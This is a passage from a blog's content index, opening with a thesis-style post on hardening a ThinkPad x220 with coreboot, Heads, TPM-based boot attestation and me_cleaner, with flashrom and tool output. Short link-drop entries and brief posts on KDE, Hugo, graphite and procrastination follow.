(GbE): 00001000 - 00002fff Flash Region 4 (Platform Data): 00fff000 - 00000fff (unused) Here, we can see the extracted partition layout of the SPI Chip.\nLayout and other Firmware There is more firmware on the SPI Chip[60, page 15] than just the BIOS/UEFI. It also contains the firmware for the NIC (Gbe) and the Intel ME. What the Intel ME is will be discussed later.\nConfiguration Now, we have all parts we need to build coreboot. To do this, we will return to the directory with the coreboot source code and run make menuconfig.\nmake menuconfig For this, we will access the sub-menu ’Mainboard’.\nAfter this, we need to configure the firmware comportment we extracted in chapter Extraction of the original firmware. We need to return to the Main menu and switch to the sub menu ’Chipset’. In this sub menu, on the lower area of the menu we have a section, called ’Intel Firmware’. The extracted files need to be included in the configuration menu. Once all configurations are done, we can run make.\nInstallation of coreboot A ROM file will be produced once the build has succeeded. The resulting file will be placed on the SPI Programmer, followed by the process of writing the ROM onto the SPI Chip.\nroot@raspberrypi:~# flashrom \\ -p linux_spi:dev=/dev/spidev0.0,spispeed=512 \\ -l ./x220.layout \\ -i bios \\ -w coreboot.rom flashrom p1.0-81-g0b59b0d on Linux 4.14.34+ (armv6l) flashrom is free software, get the source code at https://flashrom.org Using region: \u0026quot;bios\u0026quot;. Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). Found Winbond flash chip \u0026quot;W25Q64.V\u0026quot; (8192 kB, SPI) on linux_spi. Reading old flash chip contents... done. Erasing and writing flash chip... Erase/write done. Verifying flash... VERIFIED. Evaluation Rebooting the x220 would put the result to show. A black screen with white font is displaced, the text ’SeaBIOS’ can be read. Seconds later, Ubuntu is started. At this point, we just replaced one firmware with another. However, it did work!\nSecuring the Hardware As a result of the installation of coreboot, some known[86] vulnerabilities that were affecting the original UEFI/BIOS firmware were addressed. Since coreboot is a different code base, known weaknesses of the UEFI/BIOS implementation will not affect coreboot.\nCVE-2018-3640\nCVE-2018-3639\nCVE-2017-5715\nLEN-2015-002\nLEN-22133\nSeveral known weaknesses can be addressed further. Based on the findings of Trammell Hudson in his attack on Mac Book called ’Thunderstrike’[97], it can be argued that it is necessary to disable the loading of OptionROM.\nOn the contrary, flaws in other parts of a system like the processor itself remain vulnerable. For example the Meltdown/Spectre[64][65] flaws remain relevant. This involves that the laptop is still vulnerable to:\nCVE-2017-5715\nCVE-2017-5753\nCVE-2017-5754\nConventionally, we can validate all configuration parameters of coreboot in regards to security. For instance, coreboot provides a configuration parameter for vboot[87]. vboot is a mechanism in a similar fashion to ’Secure Boot’, implemented for Google Chromebooks[1, page 99] only9.\nHowever, Trammell Hudson explored[96] the idea of hardening coreboot before. Hudson provided a collection of tools that work on top of coreboot to secure it. Hudson enhanced the hardening of coreboot by the usage of a TPM.\nTrusted Platform Module The Trusted Platform Module (TPM)[@Ruan page 166] is a small chip or integrated circuit on a SoC that stores keys and certificates. The introduction of the TPM led to many worries about potential restrictions on hardware. Some have marked it as ’Treacherous Computing’[89][88]. It was believed that the TPM would favor certain types of executions over others, for example to implement ’Digital Rights Management’ (DRM).\nThe TPM turned out to be less than this. But first, we need to touch on the question: What does the ’Trusted’ imply? The word ’Trusted’ means not a binary information someone can relate to. The word rather refers to the terms of ’Trusted Computing’, allowing to make decisions at whom to trust. The expression of ’trust’ relates to a third party, allowing to make some statements about the behavior of a system. It creates a common bases to predict certain aspects in the computing, hence the name ’Predictable Computing’.\nThe TPM is designed this way and not to tell a user whether his hardware is to be trusted or not. The TPM is a passive device, that means it cannot alter the behavior of a system in anyway. It has no access to memory and is generally connected via the SPI or LPC Bus.\nIt is a simple module with a processor ranging from some MHz up to some hundred MHz. The TPM is a 28 Pin Chip or will be integrated into a SOC. There are two standards: TPM version 1.2 and 2.0. The TPM consists of a little bit of RAM and some NV RAM (see figure 4.1). In general, it has just space of several KBytes up to MBytes, depending on the vendor and price.\nThe TPM is able to encrypt, decrypt, and sign data cryptographically, but only small amounts of data. The hardware of a TPM is limited and the process of, for example, signing anything is very slow and might take up to 20 seconds. Within the TPM, a special register set exists, the ’Platform Configuration Register’ (PCR). The PCR is used for taking measurements. Its purpose is to measure the boot process, the results of the measurements are stored within the PCRs.\nThe TPM defines an ’Extend’ operation to update the value of a PCR as following[88][2, page 170]:\n$$ \\textrm{PCR}_{\\textrm{new}} = \\textrm{SHA}( \\textrm{PCR}_{\\textrm{old}} || \\textrm{SHA}(\\textrm{DATA}) )) $$\nIn the case of the TPMv1.2, this is a SHA1[90] and the value the PCR can hold is 20 Bytes. This ’Extend’ operation is a chaining signature. The chain consists of measurements from different boot stages, beginning with the initial measurements from the Intel ME, that makes the first measurement, followed by the next boot stage. Each stage updates the PCR with the measurement of the current stage plus the value from the previous measurement. This will include any OptionROMs until the boot loader.\nThe PCR therefore allows to measure the time a system needs to boot. Provided by the fact, that a change in one of the components occurs, the values of the PCRs would differ. It is possible to detect tampering or chances within the boot process. However, the TPM cannot interact in any way with the system. When the PCR values are mismatched, the TPM cannot force the system to halt.\nThe OS kernel needs to extract the result of the PCR and determinate that something went wrong. Nevertheless, when the kernel is compromised, it could simply fake this.\nAt this point, several aspects become more difficult. The TPM owns a cryptographic pair of keys (private and public), the ’Endorsement Key’ (EK). Those keys are burned into the TPM during the manufacturing process and should never leave the device. Besides the TPM, no one should have access to keys. The key can be employed in a process called ’Remote Attestation’ (RA). This can be used to let the TPM attest against a remote point. Although the EK could be used for this attestation, worries about privacy were raised. Alternatively, an ’Attestation Identity Key’ (AIK) will be used that derives from the EK.\nThe remote endpoint will get a certificate from the TPM. This certificate is signed by the TPM and chained with the SSL certificates from the manufacturer, allowing the remote endpoint to validate that the TPM is the one who signed the certificate. Yet, the certificates of vendors are often not maintained or renewed and will be transmitted over HTTP.10\nWith the AIK, the state of the PCR can be signed and transmitted to a remote endpoint, this process is called a ’Quote’. With the Quote mechanism, a remote endpoint can ensure that a system is in a specific state. Again, the mechanism relies on the remote endpoint validating this data, but it cannot tell anyone reliably whether the system was compromised or not. Furthermore, this process relies on an Internet connection.\nJoanna Rutkowska[100] from the Qubes OS project took TPM in another direction. She worked out the ’Anti Evil Maiden’. The TPM is able to ’Seal’ a secret that is only decrypted again when the PCRs are in a specific state. This can be used to store the key for disk encryption. With every boot process, a secret will be displayed. The sealed secret will only be shown once the right PCR state is reached, meaning when nothing has been changed.\nThis might lead an attacker to take over the system and then embed the secret into his rogue kernel and put this up to show. As an alternative, a secret value will be sealed with the TPM. This value serves as seed for the Time-based One-time Password algorithm (TOTP). The TPM will be used in similar fashion as two-factor-authentication (2FA).[99]\nThe TOTP token is displayed with each boot and can be validated by another device that can generate the same token, for example a SmartPhone. One problem arises from the usage of the TPM with its PCR. When something changes, the system would stop decrypting the value of PCR. But every kernel update would have the consequence that the sealedsecret stops being decrypted.\nTo address this, Trammell Hudson implemented the TOTP in Heads.\nHeads Heads[96] is a collection of open source tools that are bundled with coreboot and the Linux kernel. It effectively boots a laptop with coreboot and has Linux as payload. Heads resembles the original idea of coreboot by installing a Linux kernel into the SPI Chip.\nThe name Heads is a wordplay that refers to the Linux distribution Tails, ’The Amnesic Incognito Live System’[98], which is a stateless live system that aims at leaving no traces on a system. Heads opposes this with state fullness. The project was founded by Trammell Hudson in 2016, who is the author of various firmware based attacks like ’Thunderstrike’[96][97].\nBy extending the Linux kernel with various tools, Heads aims at hardening against hardware specific attacks. Yet, Heads is not classified as a Linux distribution. Its purpose is to move the ’root of trust’ into the ROM, by providing the necessary tools to do so. It configures coreboot in the most secure way and once written to the SPI flash, it will lock down the hardware against modification.\nTo guarantee that no unauthorized modifications are done to the hardware, the TPM will be utilized with the tpmtotp[99] tool authored by Matthew Garret. By moving tpmtotp onto the ROM, it solves the difficulty of a changing environment, because the firmware seldomly changes. Additionally, Heads can make use of features the SPI Chip provides, but are ignored by vendors (see in Figure 4.2).\nWith the usage of Heads, the Qubes OS[96][100] is recommended. At the moment, the hardware support for Heads is fairly limited to a handful devices. The x220i is indirectly supported, since the x230 is supported by the developer[96]. To get the x220 running, it needs just some adjustments.\nIntel Management Engine In chapter Layout and other Firmware, the image 3.14 portrays a disk like partitioning of the SPI Flash Chip. Coreboot was installed within the first region. This region is designed for the BIOS/UEFI software. The SPI Flash Chip also hosts within region 2 and region 3 special firmware the device needs. Region 3 is the code for the GbE, what stands for ’Gigabtye Ethernet’ and is the firmware for the NIC. Technically, this region could be removed. The consequence might be that the NIC stops working.[101]\nThe remaining region 3 is for the code of the ’Intel Management Engine’ (Intel ME or IME or ME)[91], a special part of modern x86_64 architecture. The ME was introduced in 2007 as a coprocessor to assist Intel’s 82573E series Gigabit Ethernet controller. This was shipped with a feature that is called Active Platform Management (AMT). AMT is supposed to be an out-of-band access to manage hardware in a similar fashion as IMPI.\nThe technology AMT exists and is in usage by Intel since 1999[92], but was primarily located within NICs. AMT provides features like powering on or off a device, even when this device is in sleep state or connected to the device via Serial over LAN. It also includes a web server for maintenance purposes. Over the time, further technologies were embedded into the IME, for example Bootguard or the TPM, whereas nowadays, the IME can emulate a TPM[88].\nBecause the Intel Management Engine is a processor of its own, it can act independently from the primary processor. This independence allows the processor of the ME to make changes to the main processor regardless of its current state, even in the SMM mode. Furthermore, the IME has access to the entry RAM via DMA .’invisiblethingslab’ has identified the Intel ME as a Level -3 access in 2009.\nHowever, unlike the BIOS/UEFI we cannot replace the firmware of the Intel ME.\nGame Changer Until quite recently, the IME was almost unknown in its entirety. This was due to two factors: First, Intel used an ARC[103] based architecture and second an obscure compression algorithm to store the firmware. The configurations of the ARC processor are designed during development and will be generated for specific purpose. The ’Huffman tables’ is a hardware-related compression algorithm, developed in-house by Intel.\nWith the release of the Skylake Processors generation, several changes were introduced by Intel. The ARC processor was replaced by an Intel Quark based processor[94], a low-power processor class. The Skylake generation has a new feature called ’Direct Connect Interface’ (DCI)[94]. The DCI is a new debugging interface in the Skylake processors that allows a deep insight to hardware in its doing. Technically, this should be disabled, but some vendors left the debugging interfaces active, allowing to take over a system via the JTAG. Similarly, mistakes happened to internal documents, also separate modules of the Intel ME were shipped without compression. This fact and the fact that the obscure aspects were removed allowed the research[94] from ’Positive Technologies’ (PT) to make sense of functions that are within the Intel ME. It was noticed that the IME is operated with a MINIX11 3 operation system.\nAs PT has shown in their work: ’How to hack a turned-off computer, or running unsigned code in Intel ME’[95], Intel ME is just as vulnerable as every other piece of software. Another example can be seen in the Intel AMT. They implemented a webserver in the AMT that was able to bypass the login of an administrator and run code within the Intel ME[[105]\nDisarming the ME With this degree of power and that little control of the Intel ME[18, page 44], the next logical step would be to disable the ME. Unfortunately, the research from ’Positive Technologies’ writes:\nThe disappointing fact is that on modern computers, it is impossible to completely disable ME [\u0026hellip;] (Mark Ermolov, Maxim Goryachy[104])\nErasing the firmware of the ME on the SPI Flash Chip leads to the consequence that the computer will not start. The Intel ME is therefore mandatory for starting a computer! It is however possible to ’disarm’ the Intel ME. Disarm means to reduce its functionality to a bare minimum. This is done by removing entries of the IME firmware containing code for the ME.\nFunction beyond Intent Corresponding with the findings from PT, another possibility was found, which utilizes an un-documented[104] function within the ME. It is possible to deactivate its features to a absolute minimum. The function to disarm the Intel ME was believed to be implemented for US government related agencies like the NSA. It was intended to only ship chips to this agency, however the functions are shipped with all modern processors since Skylake.\nGoogling did not take long. The second search result said that the name belongs to a trusted platform program linked to the U.S. National Security Agency (NSA). A graphics-rich presentation describing the program can be found here. Our first impulse was to set this bit and see what happens. Anyone with an SPI programmer or access to the Flash Descriptor can do this (on many motherboards, access rights to flash memory regions are set incorrectly).[\u0026hellip;] (Mark Ermolov, Maxim Goryachy[104])\nme cleaner Nicola Corna has developed a tool called me_cleaner[106]. It allows modifications to the content of an IME image. To use this tool, we first need to extract it; luckily we did this in chapter Extraction of the original firmware.\npython me_cleaner.py flashregion_2_intel_me.bin ME/TXE image detected Found FPT header at 0x10 Found 19 partition(s) Found FTPR header: FTPR partition spans from 0xcc000 to 0x142000 ME/TXE firmware version 7.1.40.1161 Public key match: Intel ME, firmware versions 7.x.x.x, 8.x.x.x Reading partitions list... FOVD (0x00000400 - 0x000001000, 0x00000c00 total bytes): removed MDES (0x00001000 - 0x000002000, 0x00001000 total bytes): removed FCRS (0x00002000 - 0x000003000, 0x00001000 total bytes): removed EFFS (0x00003000 - 0x0000c7000, 0x000c4000 total bytes): removed BIAL (NVRAM partition, no data, 0x0000adce total bytes): nothing to remove BIEL (NVRAM partition, no data, 0x00003000 total bytes): nothing to remove BIIS (NVRAM partition, no data, 0x00036000 total bytes): nothing to remove NVCL (NVRAM partition, no data, 0x000095d9 total bytes): nothing to remove NVCM (NVRAM partition, no data, 0x000043a3 total bytes): nothing to remove NVJC (NVRAM partition, no data, 0x00005000 total bytes): nothing to remove NVKR (NVRAM partition, no data, 0x0000fc13 total bytes): nothing to remove NVOS (NVRAM partition, no data, 0x00035c3c total bytes): nothing to remove NVQS (NVRAM partition, no data, 0x00000def total bytes): nothing to remove NVSH (NVRAM partition, no data, 0x00006a88 total bytes): nothing to remove NVTD (NVRAM partition, no data, 0x00001e44 total bytes): nothing to remove PLDM (NVRAM partition, no data, 0x0000a000 total bytes): nothing to remove GLUT (0x000c7000 - 0x0000cc000, 0x00005000 total bytes): removed FTPR (0x000cc000 - 0x000142000, 0x00076000 total bytes): NOT removed NFTP (0x00142000 - 0x0004fd000, 0x003bb000 total bytes): removed Removing partition entries in FPT... Removing EFFS presence flag... Correcting checksum (0xed)... Reading FTPR modules list... UPDATE (LZMA , 0x1101bd - 0x11024f ): removed BUP (Huffman, fragmented data, ~47 KiB ): NOT removed, essential KERNEL (Huffman, fragmented data, ~121 KiB ): removed POLICY (Huffman, fragmented data, ~85 KiB ): removed HOSTCOMM (LZMA , 0x11024f - 0x115808 ): removed RSA (LZMA , 0x115808 - 0x11a2b9 ): removed CLS (LZMA , 0x11a2b9 - 0x11eccb ): removed TDT (LZMA , 0x11eccb - 0x124e79 ): removed FTCS (Huffman, fragmented data, ~15 KiB ): removed The ME minimum size should be 917504 bytes (0xe0000 bytes) Checking the FTPR RSA signature... VALID Done! Good luck! The command produced the file flashregion_2_intel_me.bin with the neutralized ME file. The output shows that only the BUP remains. This is the necessary part for ’Bring Up’ a system. The next step is to flash the new content of the ME onto the SPI Flash Chip. The same steps are performed as in chapter Installation of coreboot listing 3.11.\nWhen the laptop is started now, we can see that the Intel ME remains in a minimal working state. When the laptop remains running for longer than 30 Minutes, we know that the me_cleaner tool worked as intended. By inspecting the state that the tool intelmetool foundin coreboot, we can inspect the state:\nBad news, you have a `QM67 Express Chipset Family LPC Controller` so you have ME hardware on board and you can't control or disable it, continuing... MEI found: [8086:1c3a] 6 Series/C200 Series Chipset Family MEI Controller #1 ME Status : 0x1e000245 ME Status 2 : 0x330a0006 ME: FW Partition Table : OK ME: Bringup Loader Failure : NO ME: Firmware Init Complete : YES ME: Manufacturing Mode : NO ME: Boot Options Present : NO ME: Update In Progress : NO ME: Current Working State : Normal ME: Current Operation State : M0 with UMA ME: Current Operation Mode : Normal ME: Error Code : No Error ME: Progress Phase : Policy Module ME: Power Management Event : Global reset after an error ME: Progress Phase State : Received AC\u0026lt;\u0026gt;DC switch ME: Extend SHA-256: e742b39cde8d89e3aa200272e1c31a462d3a145ea83d3c31c94c008bff379940 ME: failed to become ready ME: failed to become ready ME: GET FW VERSION message failed Without ME:\nBad news, you have a `QM67 Express Chipset Family LPC Controller` so you have ME hardware on board and you can't control or disable it, continuing... MEI found: [8086:1c3a] 6 Series/C200 Series Chipset Family MEI Controller #1 ME Status : 0x1e003052 ME Status 2 : 0x16320002 ME: FW Partition Table : OK ME: Bringup Loader Failure : NO ME: Firmware Init Complete : NO ME: Manufacturing Mode : YES ME: Boot Options Present : NO ME: Update In Progress : NO ME: Current Working State : Recovery ME: Current Operation State : M0 with UMA ME: Current Operation Mode : Normal ME: Error Code : Image Failure ME: Progress Phase : BUP Phase ME: Power Management Event : Pseudo-global reset ME: Progress Phase State : M0 kernel load ME: Extend SHA-256: e347d83be600b53579f7c32bad7beace6cca3d13e004ab944dcd8749859da1ae ME: has a broken implementation on your board withthis firmware ME: failed to become ready ME: failed to become ready ME: GET FW VERSION message failed This type of modification turns the IME into the ’Recovery’ state. We can see that the IME remains in the ’BUP Phase’, effectively the only region left on the partition of the IME. At this point, the IME only does as little as possible!\nSummary In this thesis, we presented a dive through hardware functions and their perspective on security. The Threat Model helped to identify potential attack vectors. We learned about technologies like UEFI that are present in modern systems and gained an overview about Secure Boot and its known weaknesses. We addressed this threat with coreboot and had to consider Intel Bootguard. Coreboot was explored in depth, was configured and installed on real hardware. Coreboot was improved by the usage of the TPM. Thanks to the Heads project, we hardened coreboot. In conclusion, we can say that, with this type of laptop, an incident as it was portrayed in chapter Introduction would not have happened.\nYet, there remain some uncertainties. This thesis only scratched the surface of hardware security. Trammell Hudons gave a presentation with the title: ’Bootstraping a slightly more secure laptop’ on the 33C3, whereby slightly must be seen literally. With the replacement of UEFI, we reduced the attack vector, slightly.\nHardware and firmware hide their complexity underneath a layer of obscurity. This has been demonstrated by the release of the Meltdown and Spectre vulnerabilities at the beginning of this year. Those vulnerabilities are addressed by Intel with the release of another obscure firmware.\nUnfortunately, AMD has not produced less vulnerable systems, but rather systems that are vulnerable in different ways. Building hardware as well as software is difficult. We are not very good in building these things.\nHowever, for average users there is no benefit in running coreboot, a legacy BIOS or UEFI. But Intel Bootguard and Secure Boot really solve some of the problems out there and can prevent many types of attacks against hardware.\nFor many users, this is like the spark plugs of a car engine. Most of the drivers only care for the fact, that the engine is starting. What matters to them is that the car is getting from A to B. There might be quite some ’benefits’ to have UEFI in place.\nMost users will most certainly benefit from UEFI, just as long as they remain aligned to big corporations. But it is by no means a much better system. One can only expect that more devastating security flaws will be unveiled in the future.\nMost security researchers do not disclose the way they found a rootkit.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWe should also ask what we want to protect and from whom?\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThat being said, most security lies within the ’cloud’ and therefore outside of the scope of this thesis.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThis is just an extreme example and we are not affected, because we’re using a x86_64 laptop and not an apple product. This should illustrate how wrong something can go.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nIt seems like a mandatory demand that every document or talk on UEFI must include this image showing these various boot phases.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe situation reminds strongly on the problem Android has with its software system.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWe could keep Threat Modeling, but it would exceed the scope of this thesis.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAn ’Evil Maid’ attack can be performed at all physical and portable systems.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nTo allow vboot be used by other devices like the x220i, it is necessary to rework many lines of code. A developer is working on this. But it is not in an appropriate state.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMaking them vulnerable to Man-in-the-middle attacks\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe publication from PT leads to a thanking letter from Andrew S. Tanenbaum\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2019-06-10-securing-hardware-with-coreboot/","tags":["Coreboot","Security"],"title":"Securing Hardware with Coreboot"},{"categories":[],"contents":" Why software projects take longer than you think – a statistical model · Erik Bernhardsson Creating Flow and Value in Product Development Do Stimulants Really Make the Brain Work Better? ","permalink":"https://blog.akendo.eu/flash/06.07.2019-linkdrop/","tags":["Statistics","Development","Neuroscience"],"title":"06.07.2019 - link drop"},{"categories":["Neuroscience","Psychology"],"contents":" BBC - Future - The mystery of why you can\u0026rsquo;t remember being a baby BBC - Future - This is how it feels to learn your memories are fiction BBC - Future - A new way to look at emotions – and how to master yours BBC - Future - When you can’t remember where you are or how you got there BBC - Future - What not to do in a disaster BBC - Future - Millennials are narcissistic? The evidence is not so simple BBC - Future - The mystery of why some people become sudden geniuses ","permalink":"https://blog.akendo.eu/flash/05.07.2019-linkdrop/","tags":["Neuroscience","Memory","Psychology"],"title":"05.07.2019 - link drop"},{"categories":["Security"],"contents":" media.ccc.de -Type confusion: discovery, abuse, and protection Getting 2FA Right in 2019 | Trail of Bits Blog ","permalink":"https://blog.akendo.eu/flash/02.07.2019-linkdrop/","tags":["Security","2FA","TypeConfusion"],"title":"02.07.2019 - link drop"},{"categories":[],"contents":" Nation-sponsored hackers likely carried out hostile takeover of rival group’s servers | Ars Technica Semiconductor Engineering .:. Semiconductor Engineering: 5nm Vs. 3nm A Learning Secret: Don\u0026rsquo;t Take Notes with a Laptop - Scientific American ","permalink":"https://blog.akendo.eu/flash/25.06.2019-linkdrop/","tags":["Attribution","Hardware","learning"],"title":"25.06.2019 - link drop"},{"categories":["Rust"],"contents":" Why [\u0026lsquo;1\u0026rsquo;, \u0026lsquo;7\u0026rsquo;, \u0026lsquo;11\u0026rsquo;].map(parseInt) returns [1, NaN, 3] in Javascript - Medium Tools for profiling Rust ","permalink":"https://blog.akendo.eu/flash/24.06.2019-linkdrop/","tags":["Javascript","Rust","profiling"],"title":"24.06.2019 - link drop"},{"categories":["News","Security"],"contents":" Attribution is not Transitive – Tribune Publishing Cyber Attack as a Case Study – Robert M. Lee Missing Link: Technologie-Rekuperation, oder: Wie subversive Technologien absorbiert werden | heise online AI \u0026ldquo;Stop Button\u0026rdquo; Problem - Computerphile - YouTube ","permalink":"https://blog.akendo.eu/flash/16.06.2019-linkdrop/","tags":["Security","Attribution","recuperation","A.I"],"title":"16.06.2019 - link drop"},{"categories":["KDE","Linux","Software"],"contents":"Lately, I\u0026rsquo;m trying to move away from X to Wayland. I use KDE for this and it seems to be almost possible. The only issues that I need to resolve is the configuration of multiple monitors. Wit the classic X server this can be done with the tool: xrandr or the KDE display tool.\nHowever, in Wayland there is no central tool like xrandr to configure monitors resolutions. As it seems, the Wayland protocol does not intend this. Instead, a window should set it\u0026rsquo;s own size that it going to displayed at.\nBecause of this, I\u0026rsquo;m using the tool provided by KDE: kscreen-doctor. It allows to configure the Wayland display alike X. But, it works not completely\nwith Wayland. For example, I can configure the screens resolutions, but I can not rotate them. This might relate to the docking station that is connected with thunderbolt, what might cause this problem.\nTo validate that this issues was not working properly, I started the KDE display tool. Just to be hut with the following error message: What the fuck? At this point I was recalling, to face this issues more often earlier. But, I never could found what\u0026rsquo;s the issue was. Google did not show any useful results and I was left with this bug. When archlinux is freshly installed, this issues isn\u0026rsquo;t showing on the same hardware. So it\u0026rsquo;s a problem of my installation.\nI checked on the libkscreen and noticed something: I had the package libkscreen-git installed instead of the packages located in extra libkscreen.\nHere comes a salute from the past. I\u0026rsquo;ve installed the libkscreen back when it was new and not yet in KDE. It offers some neat features and was very useful. However, the package was left installed and when KDE was upgrade to version 5 it became part of the standard.\nAt hint side, this make sense. The error message point to the fact that he\u0026rsquo;s missing symbols, a hint that there might be function missing or named differently. The fix is simple: install the right libkscreen package and your good!\n","permalink":"https://blog.akendo.eu/post/2019-06-15-a-missing-symbol/","tags":["KDE","Wayland","archlinux"],"title":"A missing Symbol"},{"categories":["Blog"],"contents":"I\u0026rsquo;m using hugo for some time now. However, one aspect of hugo was always a problem for me: Creating new posts with hugo new. This command will generate a new file with a minimal amount of meta-information necessary for a post. That\u0026rsquo;s the information above the written content like the title or the date. It also contains the option by default that the post is a draft.\nI wanted to modify this behaviour for some time now. Extending the meta-information by categories and tags. But, I was never able to figure out the right configuration parameter to do so, until now. Hugo calls this feature \u0026lsquo;Archetypes\u0026rsquo;. This word is quite inconvenient and makes no sense in my opinion.\nOne detail that also requires some attention is the way this works. You\u0026rsquo;re writing a file into the folder archetypes for the content type you want to have a template for. This is sensitive for suffix of the filename too. Adding a archetypes/default.md will only affecting all files with a .md suffix. In case you have files that have the .markdown suffix it would affect them. To fix this, you should create for each file a default file.\n","permalink":"https://blog.akendo.eu/post/2019-06-13-archtypes-in-hugo/","tags":["Hugo"],"title":"Archtypes in Hugo"},{"categories":null,"contents":"Is High Quality Software Worth the Cost?\n","permalink":"https://blog.akendo.eu/flash/13.06.2019-linkdrop/","tags":null,"title":"13.06.2019 - link drop"},{"categories":null,"contents":" Rust: A Language for the Next 40 Years - Carol Nichols A Demonstration of Stagefright-like Mistakes 4 cognitive biases you should be aware of How to Increase Productivity? The Ultimate Psychological Guide ","permalink":"https://blog.akendo.eu/flash/12.06.2019-linkdrop/","tags":null,"title":"12.06.2019 - link drop"},{"categories":null,"contents":" Stop Procrastinating With This Research-Based Psychological Method 8 powerful ways to overcome thinking errors and cognitive biases ","permalink":"https://blog.akendo.eu/flash/09.06.2019-linkdrop/","tags":null,"title":"09.06.2019 - link drop"},{"categories":null,"contents":" You Procrastinate Because Of Emotions, Not Laziness. Regulate Them To Stop Procrastinating! ","permalink":"https://blog.akendo.eu/flash/30.05.2019-linkdrop/","tags":null,"title":"30.05.2019 - link drop"},{"categories":null,"contents":" Ad Tech GDPR complaint is extended to four more European regulators - Fix AdTech ","permalink":"https://blog.akendo.eu/flash/29.05.2019-linkdrop/","tags":null,"title":"29.05.2019 - link drop"},{"categories":null,"contents":" Human Factor Security: Meadow Ellis ","permalink":"https://blog.akendo.eu/flash/28.05.2019-linkdrop/","tags":null,"title":"28.05.2019 - link drop"},{"categories":["Software"],"contents":"Today, I have learned that the \u0026lsquo;Carbon\u0026rsquo; Daemon of graphite is not able to handle encryption for incoming data. This implies, that you are not able to secure your data over untrustworthy networks. While I like graphite a lot, this is a bad thing. The workaround for this issues is the usage of stunnel\nAs an alternative the Prometheus might be an option. But in the moment the tool seems a but more complex than graphite. Writing data to it is a bigger effort, because the client needs to write/read HTTP requests and JSON, instead of a plaintext TCP connection like graphite.\n","permalink":"https://blog.akendo.eu/post/2019.05.26-what-i-have-learned-today/","tags":["Software","graphite","todayilearned","Prometheus"],"title":"What I Have Learned Today"},{"categories":null,"contents":" 100% renewables doesn’t equal zero-carbon energy, and the difference is growing | Energy Revealed: air pollution may be damaging ‘every organ in the body’ The Evidence Is Strong: Air Pollution Seems to Cause Dementia | WIRED Replacing Google Analytics with GoAccess Linux Kernel Prior to 5.0.8 Vulnerable to Remote Code Execution Toward an Information Operations Kill Chain - Lawfare Misinformation has Stages – MisinfoCon A meta-analysis of studies about debunking offers a few tips for fact-checkers – Poynter ","permalink":"https://blog.akendo.eu/flash/26.05.2019-linkdrop/","tags":null,"title":"26.05.2019 - link drop"},{"categories":null,"contents":" How Smartphones Sabotage Your Brain’s Ability to Focus ","permalink":"https://blog.akendo.eu/flash/25.05.2019-linkdrop/","tags":null,"title":"25.05.2019 - link drop"},{"categories":["Psychology"],"contents":"Today, I have learned that when you procrastinate, you not necessary feel more well.\nI was aware about the subject and that ourself tend to avoid tasks that are attached with a negative mood. Procrastination is the process of our mind to seek for another task or occupation that feels more joyful to us than what we\u0026rsquo;re about to do. Ones mind is creating a vision of ourself, that acts like us and perform the unpleased task.\nHowever, this version is tainted, it does not represent the current mood of one. Instead, we just have the notation that we\u0026rsquo;re going to do it then.\nThat the actually process of procrastination lead to a potential higher degree of dissatisfaction is new. But it does fit to my several events in my past.\nSource: Procrastination and the Priority of Short-Term Mood Regulation: Consequences for Future Self\n","permalink":"https://blog.akendo.eu/post/2019.05.24-what-i-have-learned-today/","tags":["Procrastination","todayilearned"],"title":"What I Have learned today"},{"categories":null,"contents":" Abundance of information narrows our collective attention span | EurekAlert! Science News Memory \u0026amp; Learning Breakthrough: It Turns Out That The Ancients Were Right How To Tell If Someone Is Truly Smart Or Just Average The New Heroku (Part 4 of 4): Erosion-resistance \u0026amp; Explicit Contracts | Heroku The Twelve-Factor App Don\u0026rsquo;t Use the UNIX Environment Directly - naildrivin5.com - David Bryant Copeland\u0026rsquo;s Website Blocking vs. non-blocking sockets 3 Ways that Taking Notes Has Made Me a Better Developer ","permalink":"https://blog.akendo.eu/flash/19.05.2019-linkdrop/","tags":null,"title":"19.05.2019 - link drop"},{"categories":["Rust"],"contents":"I was wondering about using something like default parameter in rust. Unfortunately, this is not the case yet. There is a workaround by using the std::default::Default.\nThere are some discussion around this subject and I do not know why, but I keep this here as a reference.\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2019-05-09-rust-default-parameter-function/","tags":["rust"],"title":"[Rust] No default parameters for function"},{"categories":null,"contents":" You Should Organize a Study Group/Book Club/Online Group/Event! Tips on How to Do It — Stephanie Hurlburt Post-mortem and remediations for Apr 11 security incident | Matrix.org blog Docker - Unauthorized access to Docker Hub database Tools for profiling Rust ","permalink":"https://blog.akendo.eu/flash/09.05.2019-linkdrop/","tags":null,"title":"09.05.2019 - link drop"},{"categories":null,"contents":" Avoiding meat and dairy is ‘single biggest way’ to reduce your impact on Earth | Environment | The Guardian UK businesses using artificial intelligence to monitor staff activity | Business | The Guardian WebAssembly: What Is It And Why Should You Care? | Hackaday ","permalink":"https://blog.akendo.eu/flash/26.04.2019-linkdrop/","tags":null,"title":"26.04.2019 - link drop"},{"categories":null,"contents":" BBC - Future - An effortless way to improve your memory ","permalink":"https://blog.akendo.eu/flash/22.04.2019-linkdrop/","tags":null,"title":"22.04.2019 - link drop"},{"categories":null,"contents":" Basic GTD: The Weekly Review Shell In A Box - A Web-Based SSH Terminal to Access Remote Linux Servers ","permalink":"https://blog.akendo.eu/flash/15.04.2019-linkdrop/","tags":null,"title":"15.04.2019 - link drop"},{"categories":null,"contents":" The new f-strings in Python 3.6 | Seasoned \u0026amp; Agile ","permalink":"https://blog.akendo.eu/flash/14.04.2019-linkdrop/","tags":null,"title":"14.04.2019 - link drop"},{"categories":null,"contents":" The Brain Needs Animal Fat How to Deliver Constructive Feedback in Difficult Situations Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps Is Less Really More? Why Reducing Code Reuse Gadget Counts via Software Debloating Doesn’t Necessarily Lead to Better Security 